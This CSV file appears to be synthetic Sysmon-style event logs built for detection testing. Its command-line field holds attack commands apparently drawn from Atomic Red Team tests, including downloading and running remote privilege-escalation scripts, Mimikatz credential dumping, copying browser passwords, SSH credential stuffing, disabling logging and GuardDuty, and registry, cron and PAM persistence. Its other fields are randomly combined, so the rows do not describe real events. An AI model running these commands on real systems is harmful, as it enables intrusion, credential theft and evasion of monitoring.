EventID,EventType,ComputerName,User,ProcessID,ProcessName,CommandLine,LogonID,LogonGuid,SourceProcessID,SourceProcessName,SourceImage,DestinationProcessID,DestinationProcessName,DestinationImage,UtcTime
1,Process Create,lt-84.west.com,wellscurtis,3691,rundll32.exe,"""query user\n"",",650785,ce6d6086-e10d-44f3-8a66-99657e9b72ab,7432,nc.exe,C:\Users\Public\in..dll,4124,rundll32.exe,C:\Windows\trade..dll,2024-05-17T01:36:51.662100Z
7,Image Load,laptop-69.baker.com,tiffany87,6701,malware.exe,"""Get-ADComputer #{hostname} -Properties *"",",945311,c9dafe14-eeeb-4730-96ef-c417a4987a4e,9654,backdoor.exe,C:\Users\Public\anything..dll,1771,taskmgr.exe,C:\Windows\wait..exe,2024-05-17T01:36:51.663101Z
3,Network Connection,lt-90.jarvis-rose.com,pagejared,5457,nc.exe,"""reg add \""HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\LanmanServer\\Parameters\"" /v AutoShareServer /t REG_DWORD /d 0 /f\nreg add \""HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\LanmanServer\\Parameters\"" /v AutoShareWks /t REG_DWORD /d 0 /f\n"",",179079,b56528ed-28db-40a7-9e47-ec03ad9fc5eb,9210,malware.exe,C:\Program Files\investment..exe,6976,nc.exe,C:\Program Files\baby..exe,2024-05-17T01:36:51.663101Z
1,Process Create,web-95.sutton-ferguson.com,grobinson,7085,powershell.exe,"""reg add \""HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\WindowsUpdate\\AU\"" /v \""NoAutoRebootWithLoggedOnUsers\"" /t REG_DWORD /d 1 /f\n"",",214650,a12919fd-9e63-4825-bc98-23e4207a9f63,3727,taskmgr.exe,C:\Windows\respond..dll,6330,powershell.exe,C:\Program Files\break..dll,2024-05-17T01:36:51.663101Z
11,File Create,desktop-70.gutierrez.com,davidvelasquez,9223,powershell.exe,"""tar -cvzf #{output_file} #{input_file_folder}\n"",",793129,5cad1559-c157-4769-b576-0f57d9153713,8787,rundll32.exe,C:\Program Files\great..exe,9613,taskmgr.exe,C:\Users\Public\only..exe,2024-05-17T01:36:51.663101Z
3,Network Connection,laptop-39.williams.info,meganhaley,6317,nc.exe,"""reboot\n"",",759629,fd62ac85-b8a2-44f7-81c5-cdcae255e0c3,8223,explorer.exe,C:\Users\Public\let..exe,8766,explorer.exe,C:\Program Files\management..exe,2024-05-17T01:36:51.664101Z
3,Network Connection,lt-19.peters-flores.com,catherine00,8817,mimikatz.exe,"""gpresult /z\n"",",769964,72d4ca49-e926-48f2-8936-ead5eee5c29e,1785,explorer.exe,C:\Windows\money..dll,7995,mimikatz.exe,C:\Program Files\car..dll,2024-05-17T01:36:51.664101Z
3,Network Connection,web-76.medina.biz,jbowman,3688,explorer.exe,"""IEX (New-Object Net.WebClient).DownloadString('#{remote_script}'); Invoke-Mimikatz -DumpCreds\n"",",168329,9f249417-f7a3-4715-82d8-1f620d625915,1984,regsvr32.exe,C:\Program Files\build..dll,6764,mimikatz.exe,C:\Windows\focus..exe,2024-05-17T01:36:51.664101Z
3,Network Connection,srv-69.butler.com,kelleyjames,9325,cmd.exe,"""iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/Get-System-Techniques/master/CreateProcess/Get-CreateProcessSystem.ps1')"",",760022,e307bd2f-7d7d-4924-9e16-03ef62394f54,2536,malware.exe,C:\Users\Public\employee..dll,2812,powershell.exe,C:\Users\Public\animal..exe,2024-05-17T01:36:51.664101Z
7,Image Load,desktop-17.miller.com,christopher08,8134,powershell.exe,"""sudo defaults read /Library/Preferences/com.apple.alf\nsudo /usr/libexec/ApplicationFirewall/socketfilterfw --getglobalstate\n"",",721888,b47693ac-20a8-4e94-a2c9-de2a408d2f3f,6090,malware.exe,C:\Users\Public\growth..exe,3566,regsvr32.exe,C:\Users\Public\during..dll,2024-05-17T01:36:51.664101Z
7,Image Load,srv-18.young.com,hmedina,4637,backdoor.exe,"""del /f #{file_to_delete}\n"",",260032,d710ec16-4372-432e-8535-ae50530f46fe,6114,nc.exe,C:\Program Files\improve..exe,3052,regsvr32.exe,C:\Program Files\forget..dll,2024-05-17T01:36:51.665102Z
11,File Create,desktop-17.mckinney-gray.info,bookersharon,9401,powershell.exe,"""#{soaphound_path} --user #{user} --password #{password} --domain #{domain} --dc #{dc} --bhdump --cachefilename #{cachefilename} --outputdirectory #{outputdirectory}\n"",",459876,b2256a1f-daa4-4a5f-9227-568bd549aa8b,3605,regsvr32.exe,C:\Users\Public\list..exe,4798,taskmgr.exe,C:\Windows\hit..exe,2024-05-17T01:36:51.665102Z
3,Network Connection,web-27.smith.com,garciakarl,8158,nc.exe,"""cp \""$PathToAtomicsFolder/T1110.004/src/credstuffuserpass.txt\"" /tmp/\nfor unamepass in $(cat /tmp/credstuffuserpass.txt);do sshpass -p `echo $unamepass | cut -d\"":\"" -f2` ssh -o 'StrictHostKeyChecking=no' `echo $unamepass | cut -d\"":\"" -f1`@#{target_host};done\n"",",780574,213d4fdd-2c84-4473-b2f3-f5e97666e001,7202,cmd.exe,C:\Windows\offer..dll,4745,mimikatz.exe,C:\Windows\side..dll,2024-05-17T01:36:51.665102Z
7,Image Load,email-96.pace-moore.com,sfranco,5642,nc.exe,"""gcloud config set project #{project_id}\ngcloud storage buckets delete gs://#{bucket_name}\n"",",951070,3ac3fecb-641e-4485-add6-51a9c6c91c68,2959,powershell.exe,C:\Program Files\mouth..exe,4302,backdoor.exe,C:\Users\Public\and..dll,2024-05-17T01:36:51.665612Z
5,Process Terminate,email-13.rodgers.net,kevinhernandez,2520,taskmgr.exe,"""reg add \""HKEY_LOCAL_MACHINE\\Software\\Policies\\Microsoft\\Windows NT\\Terminal Services\"" /v \""DisableSecuritySettings\"" /t REG_DWORD /d 1 /f\n"",",269500,6e405656-6f1c-420a-b492-eab1d9d4c1b3,8032,backdoor.exe,C:\Windows\couple..dll,9074,powershell.exe,C:\Program Files\very..dll,2024-05-17T01:36:51.665612Z
5,Process Terminate,desktop-67.jordan.biz,angelaanderson,4707,cmd.exe,"""cd /tmp\ngit clone git@github.com:WhiteOakSecurity/GoAWSConsoleSpray.git\ncd /tmp/GoAWSConsoleSpray\ngo run main.go GoAWSConsoleSpray -a #{aws_account_id} -u PathToAtomicsFolder/T1110.003/src/aws_users.txt -p PathToAtomicsFolder/T1110.003/src/aws_passwords.txt\n"",",765704,af256374-6358-4f50-9dfe-2fb17e135a4d,5263,backdoor.exe,C:\Program Files\board..exe,4042,malware.exe,C:\Users\Public\might..dll,2024-05-17T01:36:51.665612Z
1,Process Create,srv-74.watkins-mahoney.org,millerjessica,9313,malware.exe,"""echo [InternetShortcut] > #{shortcut_file_path}\necho URL=C:\\windows\\system32\\calc.exe >> #{shortcut_file_path}\n#{shortcut_file_path}\n"",",542647,bbaaf188-4820-41f3-95ab-7496806fdcbf,7966,powershell.exe,C:\Users\Public\loss..dll,2586,mimikatz.exe,C:\Windows\notice..exe,2024-05-17T01:36:51.665612Z
7,Image Load,srv-64.smith.com,aguerrero,6895,taskmgr.exe,"""wmic.exe /Namespace:\\\\root\\SecurityCenter2 Path AntiVirusProduct Get displayName /Format:List"",",185447,087bce4a-3316-4eae-adad-ff925209b052,8083,rundll32.exe,C:\Users\Public\go..dll,2378,malware.exe,C:\Program Files\itself..exe,2024-05-17T01:36:51.665612Z
7,Image Load,email-07.chandler.com,zduke,9264,mimikatz.exe,"""Invoke-ATHCompiledHelp -InfoTechStorageHandler #{infotech_storage_handler} -HHFilePath #{hh_file_path} -CHMFilePath #{chm_file_path}"",",571902,40f53418-9ded-4021-b8b7-f8b819e5ff9f,1155,mimikatz.exe,C:\Windows\exist..dll,8509,nc.exe,C:\Users\Public\tend..exe,2024-05-17T01:36:51.666620Z
5,Process Terminate,srv-70.meadows.com,hrivera,9294,nc.exe,"""get-localgroup\nGet-LocalGroupMember -Name \""Administrators\""\n"",",895454,05befd20-0044-4dd1-877c-bf740af4082e,9689,regsvr32.exe,C:\Windows\employee..dll,3934,rundll32.exe,C:\Program Files\staff..dll,2024-05-17T01:36:51.666620Z
5,Process Terminate,db-66.hudson-hanson.net,johnzavala,1679,malware.exe,"""Start-Process -FilePath \""C:Program Files (x86)\\Splashtop\\Splashtop Remote\\Server\\#{srserver_exe}\"""",",166892,e0173405-ca2f-4ca9-b8f6-86d9f4ab94f0,4551,regsvr32.exe,C:\Windows\increase..exe,3029,powershell.exe,C:\Windows\among..dll,2024-05-17T01:36:51.666620Z
1,Process Create,lt-43.conley.com,stacey84,6240,cmd.exe,"""New-Item -ItemType Directory -path \""#{new_startup_folder}\""\nCopy-Item -path \""#{payload}\"" -destination \""#{new_startup_folder}\""\nSet-ItemProperty -Path  \""HKLM:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\User Shell Folders\"" -Name \""Common Startup\"" -Value \""#{new_startup_folder}\""\n"",",622156,d0fc5425-9c8a-44c6-bae4-ec1fb491d885,8016,malware.exe,C:\Users\Public\just..dll,8529,backdoor.exe,C:\Windows\every..exe,2024-05-17T01:36:51.666620Z
7,Image Load,laptop-26.hawkins-caldwell.com,karen91,3229,regsvr32.exe,"""\""PathToAtomicsFolder\\..\\ExternalPayloads\\AdFind.exe\"" #{optional_args} -sc dclist\n"",",806876,5969685e-ed05-4bf5-9f1b-11f546bc668b,3924,nc.exe,C:\Program Files\reason..exe,4430,cmd.exe,C:\Users\Public\week..exe,2024-05-17T01:36:51.667620Z
1,Process Create,laptop-60.bennett.biz,paula31,4393,cmd.exe,"""iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/Get-System-Techniques/master/NamedPipe/NamedPipeSystem.ps1')"",",635338,4aa8dd36-51d1-4d1b-a875-60dfbca3e45d,2238,taskmgr.exe,C:\Users\Public\leg..exe,4698,powershell.exe,C:\Users\Public\interesting..dll,2024-05-17T01:36:51.667620Z
1,Process Create,email-94.welch.com,lewisjennifer,5302,taskmgr.exe,"""get-aduser -f * -pr DoesNotRequirePreAuth | where {$_.DoesNotRequirePreAuth -eq $TRUE}\n"",",884028,001759b6-2a4d-44e3-b311-cecdfb69a1ab,5045,taskmgr.exe,C:\Program Files\child..exe,8393,malware.exe,C:\Program Files\wide..dll,2024-05-17T01:36:51.667620Z
3,Network Connection,desktop-16.vasquez-smith.info,joneskristen,5743,explorer.exe,"""\""#{Path_to_file}\"" 1>NUL \n"",",602143,53573178-ac6d-402b-b2a6-bbb1b88a406a,6712,rundll32.exe,C:\Windows\company..exe,7765,cmd.exe,C:\Program Files\get..dll,2024-05-17T01:36:51.667620Z
1,Process Create,desktop-00.reynolds-bailey.com,heathereverett,3188,mimikatz.exe,"""Set-Location -path \""#{file_path}\\Sysinternals\"";\n./accesschk.exe -accepteula .;\n"",",795905,99b811f7-3aa6-4560-83f0-c215600d64f3,9248,rundll32.exe,C:\Users\Public\possible..exe,6877,malware.exe,C:\Windows\worry..dll,2024-05-17T01:36:51.667620Z
7,Image Load,web-24.grant.org,krhodes,4335,cmd.exe,"""Enable-PSRemoting -Force\n"",",752215,bd5ec7d2-f9b7-4403-81fa-e058e7e0e20e,5847,backdoor.exe,C:\Program Files\similar..dll,5133,rundll32.exe,C:\Program Files\beyond..exe,2024-05-17T01:36:51.668623Z
3,Network Connection,email-91.rowe.com,wardchristina,1971,nc.exe,"""$OriginalCommand = '#{powershell_command}'\n$Bytes = [System.Text.Encoding]::Unicode.GetBytes($OriginalCommand)\n$EncodedCommand =[Convert]::ToBase64String($Bytes)\n$EncodedCommand\npowershell.exe -EncodedCommand $EncodedCommand\n"",",664780,8e90273c-822f-45f0-8d8d-c606f779356a,8702,mimikatz.exe,C:\Users\Public\side..dll,5192,malware.exe,C:\Windows\wide..exe,2024-05-17T01:36:51.668623Z
7,Image Load,web-26.tucker-padilla.info,saguilar,1063,nc.exe,"""$TokenSet = @{\n  U = [Char[]]'ABCDEFGHIJKLMNOPQRSTUVWXYZ'\n  N = [Char[]]'0123456789'\n}\n$Upper = Get-Random -Count 5 -InputObject $TokenSet.U\n$Number = Get-Random -Count 5 -InputObject $TokenSet.N\n$StringSet = $Upper + $Number\n$rad = (Get-Random -Count 5 -InputObject $StringSet) -join ''\n$file = \""rad\"" + $rad + \"".tmp\""\n\nwhoami.exe /all >> #{output_path}\\$file\n"",",863828,88ea0967-8aa8-4bb3-a7b5-8800c198d701,8607,taskmgr.exe,C:\Windows\film..dll,9482,powershell.exe,C:\Program Files\forget..exe,2024-05-17T01:36:51.668623Z
7,Image Load,desktop-57.garcia-russell.com,rmann,4594,malware.exe,"""detectorId=$(aws guardduty create-detector --enable --region \""#{region}\"" | grep -oP '(?<=\""DetectorId\"": \"")[^\""]*')\naws guardduty update-detector --no-enable --detector-id $detectorId\naws guardduty delete-detector --detector-id $detectorId\n"",",883387,a17b8348-6ee5-47f2-9abb-583881b71503,3343,regsvr32.exe,C:\Windows\down..exe,2865,rundll32.exe,C:\Users\Public\some..exe,2024-05-17T01:36:51.668623Z
3,Network Connection,laptop-34.lee.biz,williedeleon,8449,cmd.exe,"""del %TEMP%\\PrintBrm.zip >nul 2>&1 \n#{Path_PrintBrm} -b -d #{Path_unc}  -f %TEMP%\\PrintBrm.zip -O FORCE\n"",",689807,98f42437-b7e5-4cbc-a683-ca789b1a071d,3771,regsvr32.exe,C:\Program Files\along..dll,5157,taskmgr.exe,C:\Windows\positive..dll,2024-05-17T01:36:51.668623Z
5,Process Terminate,srv-35.alexander.com,robinsonjesse,7064,powershell.exe,"""[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12\nIEX (IWR 'https://raw.githubusercontent.com/BC-SECURITY/Empire/f6efd5a963d424a1f983d884b637da868e5df466/data/module_source/privesc/Get-System.ps1' -UseBasicParsing); Get-System -Technique Token -Verbose\n"",",929620,527ce385-9c30-4f1f-87f8-256647c13e86,9010,nc.exe,C:\Users\Public\dark..exe,1124,regsvr32.exe,C:\Users\Public\lay..exe,2024-05-17T01:36:51.669622Z
5,Process Terminate,lt-63.nichols-tapia.net,taylorantonio,5752,rundll32.exe,"""#{pscp_file} -pw #{vm_pass} #{vib_file} #{vm_user}@#{vm_host}:/tmp\necho \""\"" | \""#{plink_file}\"" \""#{vm_host}\"" -ssh  -l \""#{vm_user}\"" -pw \""#{vm_pass}\"" -m \""#{vib_install}\""\n"",",694475,e28e16ad-f5bb-4ecd-b5df-f7390d064f34,1702,regsvr32.exe,C:\Users\Public\difficult..exe,7179,explorer.exe,C:\Windows\write..exe,2024-05-17T01:36:51.669622Z
11,File Create,srv-45.smith-stephenson.net,sara46,8038,regsvr32.exe,"""esentutl.exe /y \""%LOCALAPPDATA%\\Google\\Chrome\\User Data\\Default\\Login Data\"" /d \""#{output_path}\""\n"",",446838,f16cc847-a85b-4529-a3e5-18432bb610f2,3172,malware.exe,C:\Users\Public\team..dll,7804,nc.exe,C:\Windows\accept..exe,2024-05-17T01:36:51.669622Z
7,Image Load,laptop-71.wright.com,adrian85,2050,regsvr32.exe,"""Set-ItemProperty \""HKLM:\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\\"" \""Userinit\"" \""Userinit.exe, #{binary_to_execute}\"" -Force\n"",",337627,c45026f9-3b5d-4ad5-8117-87c3cfd9d58e,4212,explorer.exe,C:\Program Files\black..exe,1160,mimikatz.exe,C:\Users\Public\pull..exe,2024-05-17T01:36:51.669622Z
5,Process Terminate,lt-27.sims.org,jordanangela,2015,mimikatz.exe,"""$ss = ConvertTo-SecureString \""#{password}\"" -AsPlainText -Force\n$cred = New-Object PSCredential -ArgumentList '#{username}', $ss\n$param = @{\n    Credential = $cred\n    Force      = $true\n}\n$null = Connect-AzAccount @param\n$token = (Get-AzAccessToken -ResourceTypeName MSGraph -ErrorAction Stop).token\n$cert = New-SelfSignedCertificate -Subject \""CN=PowerShell Application\"" -CertStoreLocation \""Cert:\\CurrentUser\\My\"" -KeyExportPolicy Exportable -KeySpec Signature -KeyLength 2048 -KeyAlgorithm RSA -HashAlgorithm SHA256\n$reqResourceAccess = ( @{ \""resourceAccess\"" = (@{\""id\""= \""570282fd-fa5c-430d-a7fd-fc8dc98a9dca\""; \""type\""= \""Scope\""}, @{ \""id\""= \""7427e0e9-2fba-42fe-b0c0-848c9e6a8182\""; \""type\""= \""Scope\""}, @{\""id\""= \""37f7f235-527c-4136-accd-4a02d197296e\""; \""type\""= \""Scope\""}, @{\""id\""= \""14dad69e-099b-42c9-810b-d002981feec1\""; \""type\""= \""Scope\""}, @{ \""id\""= \""e1fe6dd8-ba31-4d61-89e7-88639da4683d\""; \""type\""= \""Scope\""}, @{ \""id\""= \""810c84a8-4a9e-49e6-bf7d-12d183f40d01\""; \""type\""= \""Role\""}); \""resourceAppId\"" = \""00000003-0000-0000-c000-000000000000\"" })\nconnect-mggraph -AccessToken $token\n$context = Get-MgContext       \n$users = get-MgUser\n$app = New-MgApplication -DisplayName \""T1114.002 Atomic Test #1 - Office365 - Remote Email Collection\"" -RequiredResourceAccess $reqResourceAccess -Web @{ RedirectUris=\""http://localhost\""; } -KeyCredentials @(@{ Type=\""AsymmetricX509Cert\""; Usage=\""Verify\""; Key=$cert.RawData })\nNew-MgServicePrincipal -AppId $app.appId -AdditionalProperties @{} | Out-Null\n$resourceSPN = Get-MgServicePrincipal -Filter \""AppId eq '$($app.AppId)'\""\n$graphApiApp = Get-MgServicePrincipal -Filter \""DisplayName eq 'Microsoft Graph'\""\n$mailRole = $graphApiApp.AppRoles|Where-Object Value -Eq \""Mail.Read\""\nNew-MgServicePrincipalAppRoleAssignment -ServicePrincipalId $resourceSPN.Id -PrincipalId $resourceSPN.Id -ResourceId $graphApiApp.id -AppRoleId $mailRole.Id\n$mailbox1 = \""#{1st_target_mailbox}\""\n$mailbox2 = \""#{2nd_target_mailbox}\""\n$mailbox3 = \""#{3rd_target_mailbox}\""\n[System.Collections.ArrayList]$selectUsers = @()\nforeach ($user in $users) {if (($user.Mail -eq $mailbox1) -Or ($user.Mail -eq $mailbox2) -Or ($user.Mail -eq $mailbox3)){$selectUsers.Add($user.id)}}\nconnect-mggraph -ClientId $app.AppId -TenantId $context.TenantId -CertificateName $cert.Subjectname.Name\nforeach ($user in $selectUsers) { $url= \""https://graph.microsoft.com/v1.0/users/$($user)/messages\"" ; Invoke-MgGraphRequest -Uri $url -Method GET -OutputType PSObject}\n"",",602511,adaf8e6d-0a61-4f37-8e3e-1d2a1650063d,4053,malware.exe,C:\Program Files\part..exe,8787,malware.exe,C:\Program Files\country..dll,2024-05-17T01:36:51.669622Z
3,Network Connection,srv-33.hernandez-davis.info,slynch,1360,rundll32.exe,"""echo \""#{command}\"" >> /var/spool/cron/crontabs/#{cron_script_name}\n"",",552241,179953c2-21ae-41e7-91c5-e7ef0ca09c31,1521,backdoor.exe,C:\Program Files\behind..dll,4186,mimikatz.exe,C:\Windows\often..dll,2024-05-17T01:36:51.670618Z
5,Process Terminate,srv-69.ballard-rowe.com,robert18,5751,rundll32.exe,"""sudo launchctl unload /Library/LaunchDaemons/com.opendns.osx.RoamingClientConfigUpdater.plist\n"",",789887,5d3b4c4b-fdf4-4beb-b26f-bec9c6dde1fe,8862,cmd.exe,C:\Windows\then..dll,5891,nc.exe,C:\Windows\after..exe,2024-05-17T01:36:51.670618Z
3,Network Connection,laptop-31.ward.com,phillipphillips,4236,powershell.exe,"""reg add HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer /v DisallowRun /t REG_DWORD /d 1 /f\nreg add HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\DisallowRun /f /t REG_SZ /v art1 /d \""regedit.exe\""\nreg add HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\DisallowRun /f /t REG_SZ /v art2 /d \""cmd.exe\""\n"",",921466,c64bf6df-df38-404c-9add-fa18eac3fa31,2037,regsvr32.exe,C:\Program Files\six..dll,4578,malware.exe,C:\Users\Public\certainly..exe,2024-05-17T01:36:51.670618Z
3,Network Connection,laptop-55.knight.com,michaelhill,7209,backdoor.exe,"""sudo systemctl stop systemd-journald #disables journal logging\n"",",186175,53ba4c8a-1df7-42c2-82bf-1cd456f4b7b8,7798,rundll32.exe,C:\Users\Public\both..dll,2134,explorer.exe,C:\Program Files\level..exe,2024-05-17T01:36:51.670618Z
3,Network Connection,web-14.gibson.com,natalie02,6777,explorer.exe,"""cp /bin/sh /tmp/crond;\necho 'sleep 5' | /tmp/crond\n"",",853923,682a5676-b868-47c8-b242-efa2bfe54583,9381,explorer.exe,C:\Windows\western..exe,6233,malware.exe,C:\Windows\ability..exe,2024-05-17T01:36:51.671619Z
5,Process Terminate,email-62.martin-higgins.info,ustewart,8079,powershell.exe,"""apt install xclip -y\nhistory | tail -n 30 | xclip -sel clip\nxclip -o > history.txt\n"",",853657,7d88ea8e-4c0d-45eb-a054-15a666e631b0,5448,nc.exe,C:\Program Files\agent..dll,3680,explorer.exe,C:\Windows\alone..exe,2024-05-17T01:36:51.671619Z
1,Process Create,web-03.miller.com,gregory47,8618,powershell.exe,"""if [ \""$(uname)\"" = 'FreeBSD' ]; then cmd=\""netstat -Sp tcp\""; else cmd=\""netstat -ant\""; fi;\nif [ -x \""$(command -v arp)\"" ]; then arp -a; else echo \""arp is missing from the machine. skipping...\""; fi;\nif [ -x \""$(command -v ifconfig)\"" ]; then ifconfig; else echo \""ifconfig is missing from the machine. skipping...\""; fi;\nif [ -x \""$(command -v ip)\"" ]; then ip addr; else echo \""ip is missing from the machine. skipping...\""; fi;\nif [ -x \""$(command -v netstat)\"" ]; then $cmd | awk '{print $NF}' | grep -v '[[:lower:]]' | sort | uniq -c; else echo \""netstat is missing from the machine. skipping...\""; fi;\n"",",808731,db6009f9-dfcc-499f-8d67-2160206f0d24,8393,mimikatz.exe,C:\Windows\early..exe,1533,cmd.exe,C:\Users\Public\population..exe,2024-05-17T01:36:51.671619Z
3,Network Connection,srv-01.shah.net,jessica93,9387,rundll32.exe,"""C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\csc.exe /out:#{output_file} \""#{input_file}\""\n"",",363669,9aa61b0c-d0e2-4830-851c-579815cf29e7,1638,explorer.exe,C:\Windows\west..dll,7506,explorer.exe,C:\Program Files\nice..exe,2024-05-17T01:36:51.671619Z
7,Image Load,email-39.smith-wright.com,pollardjohn,9074,mimikatz.exe,"""Mount-DiskImage -ImagePath \""#{path_of_iso}\"" -StorageType ISO -Access ReadOnly\n$keep = Get-Volume -FileSystemLabel \""TestIso\""\n$driveLetter = ($keep | Get-Volume).DriveLetter\ninvoke-item \""$($driveLetter):\\hello.exe\""\n"",",124019,a98719cb-3232-4a44-b281-167473b15346,1478,regsvr32.exe,C:\Windows\total..exe,7547,taskmgr.exe,C:\Program Files\time..exe,2024-05-17T01:36:51.671619Z
5,Process Terminate,email-96.wilkins-hess.com,epage,3361,cmd.exe,"""netstat -r | grep default\n"",",587957,4b301862-7250-413d-8248-15916ce9aa7d,4058,mimikatz.exe,C:\Program Files\ball..exe,3662,cmd.exe,C:\Program Files\short..exe,2024-05-17T01:36:51.671619Z
5,Process Terminate,web-15.hurley.com,williamslindsay,4952,powershell.exe,"""$S3cur3Th1sSh1t_repo='https://raw.githubusercontent.com/S3cur3Th1sSh1t'\niex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')\noldchecks -noninteractive -consoleoutput"",",516300,0d1bd3f4-a573-4153-b3a1-3e06dac7ad07,4199,explorer.exe,C:\Program Files\month..exe,8917,malware.exe,C:\Program Files\six..exe,2024-05-17T01:36:51.672618Z
11,File Create,email-12.fields-kemp.info,kelly68,9344,regsvr32.exe,"""\""PathToAtomicsFolder\\..\\ExternalPayloads\\AdFind.exe\"" -f (objectcategory=organizationalUnit) #{optional_args}\n"",",881528,4c8f2cc3-8557-4aad-a26e-2ed86017f697,5086,powershell.exe,C:\Windows\story..exe,7415,mimikatz.exe,C:\Program Files\nice..exe,2024-05-17T01:36:51.672618Z
11,File Create,srv-76.lee.com,landrykaren,8932,explorer.exe,"""copy-item \""$env:windir\\System32\\cmd.exe\"" -destination \""$env:allusersprofile\\cmd.exe\""\nstart-process \""$env:allusersprofile\\cmd.exe\""\nsleep -s 5 \nstop-process -name \""cmd\"" | out-null"",",621495,1d079e03-c6e1-4a72-aab5-dcc7fbe190e3,9571,rundll32.exe,C:\Users\Public\collection..dll,2903,taskmgr.exe,C:\Users\Public\watch..dll,2024-05-17T01:36:51.672618Z
3,Network Connection,web-83.adams-williams.com,huntervalerie,6625,regsvr32.exe,"""New-LocalUser -Name \""Administrator \"" -NoPassword"",",448973,d73fc6e0-da1a-443c-8055-fd1dd7e03ea3,4589,powershell.exe,C:\Users\Public\factor..exe,6432,malware.exe,C:\Program Files\collection..dll,2024-05-17T01:36:51.672618Z
1,Process Create,srv-81.rodriguez-baker.com,marymedina,3158,explorer.exe,"""$TokenSet = @{\n  U = [Char[]]'ABCDEFGHIJKLMNOPQRSTUVWXYZ'\n  N = [Char[]]'0123456789'\n}\n$Upper = Get-Random -Count 5 -InputObject $TokenSet.U\n$Number = Get-Random -Count 5 -InputObject $TokenSet.N\n$StringSet = $Upper + $Number\n$rad = (Get-Random -Count 5 -InputObject $StringSet) -join ''\n$file = \""rad\"" + $rad + \"".tmp\""\n\nwhoami.exe /all >> #{output_path}\\$file\n"",",817097,cc4643cd-6f14-4d4d-8c9f-6fed82c765f4,5116,cmd.exe,C:\Windows\bag..exe,1009,explorer.exe,C:\Users\Public\far..exe,2024-05-17T01:36:51.672618Z
11,File Create,web-25.thompson.com,mstark,7643,rundll32.exe,"""if sudo test -f /etc/pam.d/password-auth; then sudo cp /etc/pam.d/password-auth /tmp/password-auth.bk; fi;\nif sudo test -f /etc/pam.d/system-auth; then sudo cp /etc/pam.d/system-auth /tmp/system-auth.bk; fi;\nsudo touch /tmp/password-auth.bk\nsudo touch /tmp/system-auth.bk sudo echo \""session    required    pam_tty_audit.so\nenable=* log_password\"" >> /etc/pam.d/password-auth sudo echo \""session    required    pam_tty_audit.so\nenable=* log_password\"" >> /etc/pam.d/system-auth\n"",",342899,2d91ffb4-3210-4682-9085-0313e3e97edb,5611,mimikatz.exe,C:\Windows\story..exe,5705,explorer.exe,C:\Program Files\similar..dll,2024-05-17T01:36:51.673619Z
1,Process Create,lt-65.knight-cardenas.info,russoveronica,5834,malware.exe,"""REG ADD HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnceEx\\0001\\Depend /v 1 /d \""#{thing_to_execute}\""\n"",",464056,3df3f9a0-b132-4ae7-bce8-8a3ac2be9c25,3584,malware.exe,C:\Users\Public\leader..dll,2388,powershell.exe,C:\Windows\point..exe,2024-05-17T01:36:51.673619Z
7,Image Load,desktop-91.hall.com,michaelarcher,8769,explorer.exe,"""osascript -e 'tell application \""Finder\"" to delete POSIX file \""#{system_log_path}\""'\n"",",314800,8210a005-587a-470d-923d-cdac2285249f,2967,rundll32.exe,C:\Program Files\accept..exe,1770,mimikatz.exe,C:\Program Files\of..dll,2024-05-17T01:36:51.673619Z
7,Image Load,srv-33.gentry.com,qsimmons,4483,cmd.exe,"""$notepad = Start-Process notepad -passthru\nStart-Process \""$PathToAtomicsFolder\\T1055\\bin\\x64\\InjectView.exe\""\n"",",805981,e89e0175-cff5-4eaf-aa59-16122f70d767,3163,taskmgr.exe,C:\Users\Public\office..dll,5209,powershell.exe,C:\Windows\sit..dll,2024-05-17T01:36:51.673619Z
